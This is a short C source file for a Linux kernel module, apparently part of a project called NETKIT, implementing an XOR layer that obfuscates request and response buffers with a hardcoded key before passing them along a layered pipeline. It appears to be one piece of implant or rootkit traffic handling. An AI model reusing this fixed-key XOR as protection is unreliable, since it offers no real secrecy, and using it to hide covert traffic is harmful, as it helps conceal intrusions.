#include <linux/types.h>
#include <linux/slab.h>

#include "xor.h"

#include "../iface.h"
#include "../../sys/crypto.h"
#include "../../sys/mem.h"
#include "../../sys/debug.h"

static int gen_xor_key(u8 *key, size_t keylen, size_t buflen, u8 **out_buf)
{

    *out_buf = kzmalloc(buflen, GFP_KERNEL);
    if (IS_ERR(*out_buf))
        return PTR_ERR(*out_buf);
    
    // xor_key_buf needs to be an array as long as req_buf to be xor'd with
    for (size_t i=0; i < buflen; i++)
        (*out_buf)[i] = key[i % keylen];

    return 0;
}

#define XOR_KEY "NETKIT_XOR"

int layer_xor_process(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, size_t index)
{
    u8* next_req_buf = NULL;
    size_t next_req_buflen = 0;
    u8* next_res_buf = NULL;
    size_t next_res_buflen = 0;
    u8* xor_key_buf;
    int retv;

    retv = gen_xor_key(XOR_KEY, 10, req_buflen, &xor_key_buf);
    if (retv < 0)
        return retv;

    retv = xor_crypt(req_buflen, xor_key_buf, req_buf, &next_req_buf, &next_req_buflen);
    kzfree(xor_key_buf, req_buflen);

    if (retv < 0)
    {
        NETKIT_LOG("[!] xor 1 failed\n");
        return retv;
    }
    
    retv = call_next_layer(next_req_buf, next_req_buflen, &next_res_buf, &next_res_buflen, index+1);
    kzfree(next_req_buf, next_req_buflen);

    // check buf output, since a non-err layer can return no buff
    if (next_res_buf == NULL)
        return retv;

    retv = gen_xor_key(XOR_KEY, 10, next_res_buflen, &xor_key_buf);
    if (retv < 0)
        return retv;

    retv = xor_crypt(next_res_buflen, xor_key_buf, next_res_buf, res_buf, res_buflen);
    kzfree(next_res_buf, next_res_buflen);
    kzfree(xor_key_buf, next_res_buflen);

    if (retv < 0)
    {
        NETKIT_LOG("[!] xor 2 failed\n");
        return retv;
    }

    return 0;
}